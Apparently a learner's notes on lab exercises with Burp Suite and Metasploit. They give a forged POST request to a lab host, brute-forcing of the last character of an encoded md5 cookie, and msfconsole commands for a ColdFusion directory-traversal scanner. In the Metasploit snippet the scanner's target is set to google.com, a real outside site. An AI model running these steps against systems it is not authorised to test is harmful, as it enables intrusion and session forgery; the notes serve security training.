**The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.
```
POST /lucky.php HTTP/1.1
Host: 83.136.250.108:44356
Content-Length: 12
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://83.136.250.108:44356
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.250.108:44356/lucky.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

getflag=true
```
- Repeat in Burp until obtain the flag


**The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.
Decode ascii hex, then decode as Base64.

**Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload)
Burp Intruder
- Payload configuration = /usr/share/seclists/fuzzer/alphanumeric.txt
- Payload processing = add prefix: 3dac93b8cd250aa8c1a36fffc79a17a
- Base64-encode
- Encode as ASCII hex

**You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?
```
sudo msfconsole
use auxiliary/scanner/http/coldfusion_locale_traversal
options
set proxies http:127.0.0.1:8080
set RHOSTS https://google.com
run
```
